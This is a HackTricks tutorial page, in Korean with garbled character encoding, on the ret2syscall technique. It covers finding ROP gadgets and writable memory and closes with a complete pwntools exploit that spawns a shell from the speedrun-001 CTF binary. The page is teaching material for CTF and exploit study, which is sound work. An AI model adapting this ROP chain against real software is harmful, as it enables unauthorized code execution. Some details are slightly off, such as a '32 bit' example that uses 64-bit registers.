# Ret2syscall

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

ì´ê²ƒì€ Ret2libì™€ ìœ ì‚¬í•˜ì§€ë§Œ, ì´ ê²½ìš°ì—ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤. ì´ ê²½ìš°ì—ëŠ” `sys_execve` ì‹œìŠ¤í…œ í˜¸ì¶œì„ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ì¼ë¶€ ì¸ìˆ˜ë¡œ `/bin/sh`ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ì¤€ë¹„í•  ê²ƒì…ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ì¼ë°˜ì ìœ¼ë¡œ ì •ì ìœ¼ë¡œ ì»´íŒŒì¼ëœ ì´ì§„ íŒŒì¼ì—ì„œ ìˆ˜í–‰ë˜ë¯€ë¡œ ë§ì€ ê°€ì ¯ê³¼ ì‹œìŠ¤í…œ í˜¸ì¶œ ëª…ë ¹ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì‹œìŠ¤í…œ í˜¸ì¶œ**ì„ ì¤€ë¹„í•˜ê¸° ìœ„í•´ ë‹¤ìŒ êµ¬ì„±ì´ í•„ìš”í•©ë‹ˆë‹¤:

* `rax: 59 sys_execve ì§€ì •`
* `rdi: "/bin/sh"ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° ì‹¤í–‰í•  íŒŒì¼ ì§€ì •`
* `rsi: 0 ì „ë‹¬ëœ ì¸ìˆ˜ ì—†ìŒ ì§€ì •`
* `rdx: 0 ì „ë‹¬ëœ í™˜ê²½ ë³€ìˆ˜ ì—†ìŒ ì§€ì •`

ë”°ë¼ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ë¬¸ìì—´ `/bin/sh`ë¥¼ ì–´ë”˜ê°€ì— ì“°ê³ , ê·¸ëŸ° ë‹¤ìŒ `syscall`ì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤(ìŠ¤íƒì„ ì œì–´í•˜ê¸° ìœ„í•´ í•„ìš”í•œ íŒ¨ë”©ì„ ê³ ë ¤í•˜ë©´ì„œ). ì´ë¥¼ ìœ„í•´ ì•Œë ¤ì§„ ì˜ì—­ì— `/bin/sh`ë¥¼ ì“¸ ìˆ˜ ìˆëŠ” ê°€ì ¯ì´ í•„ìš”í•©ë‹ˆë‹¤.

{% hint style="success" %}
í˜¸ì¶œí•  ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ ì‹œìŠ¤í…œ í˜¸ì¶œì€ **`mprotect`**ì´ë©°, ì´ë¥¼ í†µí•´ ê³µê²©ìê°€ **ë©”ëª¨ë¦¬ì˜ í˜ì´ì§€ ê¶Œí•œì„ ìˆ˜ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” [**ret2shellcode**](../stack-overflow/stack-shellcode.md)ì™€ ê²°í•©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

## ë ˆì§€ìŠ¤í„° ê°€ì ¯

**ì´ëŸ¬í•œ ë ˆì§€ìŠ¤í„°ë¥¼ ì œì–´í•˜ëŠ” ë°©ë²•**ì„ ì°¾ì•„ë´…ì‹œë‹¤:
```bash
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
ë‹¤ìŒ ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ì—¬ **ìŠ¤íƒì— ë‚´ìš©ì„ ì‘ì„±í•˜ê³  ë ˆì§€ìŠ¤í„°ë¡œ ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë¬¸ìì—´ ì‘ì„±

### ì“°ê¸° ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬

ë¨¼ì € ë©”ëª¨ë¦¬ì—ì„œ ì“°ê¸° ê°€ëŠ¥í•œ ìœ„ì¹˜ë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### ë©”ëª¨ë¦¬ì— ë¬¸ìì—´ ì‘ì„±

ê·¸ëŸ° ë‹¤ìŒì´ ì£¼ì†Œì— ì„ì˜ì˜ ë‚´ìš©ì„ ì‘ì„±í•˜ëŠ” ë°©ë²•ì„ ì°¾ì•„ì•¼í•©ë‹ˆë‹¤.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
### ROP ì²´ì¸ ìë™í™”

ë‹¤ìŒ ëª…ë ¹ì€ ì“°ê¸°-ë¬´ì—‡-ì–´ë””ì— ê°€ì ¯ê³¼ ì‹œìŠ¤ì½œ ëª…ë ¹ì–´ê°€ ìˆëŠ” ì •ì  ì´ì§„ íŒŒì¼ì—ì„œ ì™„ì „í•œ `sys_execve` ROP ì²´ì¸ì„ ìƒì„±í•©ë‹ˆë‹¤:
```bash
ROPgadget --binary vuln --ropchain
```
#### 32 ë¹„íŠ¸
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 ë¹„íŠ¸
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## ë¶€ì¡±í•œ ê°€ì ¯

ë§Œì•½ ë©”ëª¨ë¦¬ì— `/bin/sh`ë¥¼ ì‘ì„±í•  ê°€ì ¯ì´ **ë¶€ì¡±í•œ ê²½ìš°**, **SROP ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ìŠ¤íƒì—ì„œ ëª¨ë“  ë ˆì§€ìŠ¤í„° ê°’(í¬í•¨í•˜ì—¬ RIP ë° ë§¤ê°œë³€ìˆ˜ ë ˆì§€ìŠ¤í„°)ì„ ì œì–´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="srop-sigreturn-oriented-programming.md" %}
[srop-sigreturn-oriented-programming.md](srop-sigreturn-oriented-programming.md)
{% endcontent-ref %}

## ê³µê²© ì˜ˆì œ
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## ë‹¤ë¥¸ ì˜ˆì œ ë° ì°¸ê³  ìë£Œ

* [https://guyinatuxedo.github.io/07-bof_static/dcquals19_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof_static/dcquals19_speedrun1/index.html)
* 64 ë¹„íŠ¸, PIE ì—†ìŒ, nx, ë©”ëª¨ë¦¬ì— `execve`ë¥¼ í˜¸ì¶œí•˜ëŠ” ROPë¥¼ ì‘ì„±í•˜ê³  ê±°ê¸°ë¡œ ì´ë™í•˜ëŠ” ë°©ë²•.
* [https://guyinatuxedo.github.io/07-bof_static/bkp16_simplecalc/index.html](https://guyinatuxedo.github.io/07-bof_static/bkp16_simplecalc/index.html)
* 64 ë¹„íŠ¸, nx, PIE ì—†ìŒ, ë©”ëª¨ë¦¬ì— `execve`ë¥¼ í˜¸ì¶œí•˜ëŠ” ROPë¥¼ ì‘ì„±í•˜ê³  ê±°ê¸°ë¡œ ì´ë™í•˜ëŠ” ë°©ë²•. ìˆ˜í•™ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” í•¨ìˆ˜ë¥¼ ìŠ¤íƒì— ì“°ê¸° ìœ„í•´ ë‚¨ìš©ë¨.
* [https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html](https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html)
* 64 ë¹„íŠ¸, PIE ì—†ìŒ, nx, BF canary, ë©”ëª¨ë¦¬ì— `execve`ë¥¼ í˜¸ì¶œí•˜ëŠ” ROPë¥¼ ì‘ì„±í•˜ê³  ê±°ê¸°ë¡œ ì´ë™í•˜ëŠ” ë°©ë²•.
